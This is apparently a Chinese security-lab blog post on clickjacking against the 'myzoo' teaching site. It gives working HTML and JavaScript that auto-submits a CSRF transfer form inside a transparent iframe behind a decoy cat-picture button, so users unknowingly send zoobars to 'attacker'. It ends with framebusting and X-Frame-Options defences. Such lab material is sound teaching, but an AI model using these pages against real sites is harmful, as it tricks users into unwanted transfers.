---
layout: post
title: InfoSec:ClickJacking
category: InfoSec_LAB
description: InfoSec:ClickJacking
published: true
---

## 实验介绍
clickjacking（点击劫持）是通过在页面上覆盖一层透明的iframe，诱导用户点击网页，实际上点击的是透明的iframe，从而达到一些攻击的目的，原理十分简单

![image.png-130.5kB][1]

本次实验依然使用myzoo，通过构建一个clickjacking网站偷取用户zoobar


## 实验平台
Ubuntu 16.04 虚拟机
FireFox 浏览器

## 实验步骤
### 实验网站
[下载地址](https://github.com/WindMelon/Myzoo/tree/master)
[环境配置](https://www.cnblogs.com/pualus/p/6829644.html)

### 基本思路

- 构造一次失败的CSRF攻击网页1.html
- 将CSRF网页加到2.html的iframe中
- 在2.html中完成clickjacking

**1.html**
```
<html>

<head>

</head>

<body>

<form method=POST name=transferform

  action="http://www.myzoo.com/transfer.php" id="form">

<input name=zoobars type=hidden value="2">

<input name=recipient type=hidden value="attacker">

<input type=hidden name=submission value="Send">

</form>

</body>

<script>

  var form = document.getElementById('form');

  form.submit();

</script>

</html>
```

通过一次失败的CSRF攻击可以让iframe跳转到zoobar的转账页面，同时自动填写好转账给谁和转账的zoobar数目

2.html
```
<!DOCTYPE html>

<html>

<head>

<style>

     html,body{

	top: -0px;

        left: -0px;

        display: block;

        height: 50%;

        width: 100%;

     }

     iframe{

	top:200px;

	left:500px;

        width: 1000px;

        height: 500px;

        position: absolute;

        z-index: 1;

        -moz-opacity: 0;

        opacity: 0;

        filter: alpha(opacity=0);



     }

     #mybutton{

        position:absolute;

        z-index: 0;

	top:480px;

	left:880px;

	pointer-events:none;

     }

     #mybutton2{

        position:absolute;

	top:-1px;

	left:-1px;

     }

     img{

	position:absolute;

	top:200px;

	left:800px;

     }

</style>

</head>

<body>

<img src="1.jpg" height=200 width=250 id="myimage"></img>

<iframe src = "1.html" id="myframe" ></iframe>

<button id="mybutton" onclick=Try()>Try!</button>

<button id="mybutton2" onclick=showframe()>showframe</button>

</body>

<script type="text/javascript">

function Try(){

	document.getElementById('mybutton').style.pointerEvents='none';

        var element = document.getElementById('myimage');

	var src = Math.round(Math.random()*6+1);

	src = src+".jpg";

	element.src = src;



}

function showframe(){

	var opacity = document.getElementById('myframe').style.opacity;

        if(opacity>0) document.getElementById('myframe').style.opacity = 0;

	else document.getElementById('myframe').style.opacity = 0.2;

}





function delayRun(code,time) {

   var t=setTimeout(code,time);

}



var myConfObj = {

  iframeMouseOver : false

}

var count = 0;

window.addEventListener('blur',function(){

  if(myConfObj.iframeMouseOver){

    //alert("frame clicked!");

    count++;



        //alert("count = 2!");

	document.getElementById('myframe').style.zIndex=-1;

	delayRun("document.getElementById('mybutton').style.pointerEvents='auto';",100);

	//document.getElementById('mybutton').style.pointerEvents="auto";

    

  }

});



document.getElementById('myframe').addEventListener('mouseover',function(){

   myConfObj.iframeMouseOver = true;

});

document.getElementById('myframe').addEventListener('mouseout',function(){

    myConfObj.iframeMouseOver = false;

});

</script>



</html>
```

界面是这样

![image.png-153.9kB][2]

点击Try按钮，可以随机切换猫咪图片

![image.png-162.9kB][3]

但其实背后是这样的

![image.png-236.3kB][4]

点击的逻辑是这样的：
1. 第一次点击Try，此时Try为不可点击状态，实际上点击的是iframe的send，完成一次转账，同时设置Try为可点击
2. 第二次点击Try，切换猫咪图片，同时设置Try为不可点击
3. 第三次点击Try，同第一次

通过这样，用户只会觉得button不是很灵敏，而不易察觉已被clickjacked，在不知不觉中将zoobar转给攻击者


## ClickJacking的防护
### javascript防御
Stanford大学曾经对美国各大网站的clickjacking防护代码进行了分析，最后推荐用以下代码对clickjacking进行防护
```
<html>
<title>
Framebust is not easy!
</title>

<style>body {display:none;}</style>
<body>
I'm not be framed!

<script>
if(self==top) {
        
        document.getElementsByTagName("body")[0].style.display='block';

}
else{ top.location = self.location;}
</script>
</body>
</html>
```

### 服务器端防护
根据新的浏览器标准，可以在服务器端进行防御，不允许非同源网站的iframe加载本网站的内容
配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 'site' 的配置中:
```
Header always append X-Frame-Options SAMEORIGIN
```

php中，可以这样设置
```
<?php
header("X-Frame-Options:DENY");
?>
```

  [1]: http://static.zybuluo.com/windmelon/pfoimcshxnl1gfkp6zc2la2j/image.png
  [2]: http://static.zybuluo.com/windmelon/2pron2ttutb39qgqlt0pv2ot/image.png
  [3]: http://static.zybuluo.com/windmelon/s9ps65j0l9vfset9n2lp7nim/image.png
  [4]: http://static.zybuluo.com/windmelon/cwxt5j0o791uhbnaph5nnnzn/image.png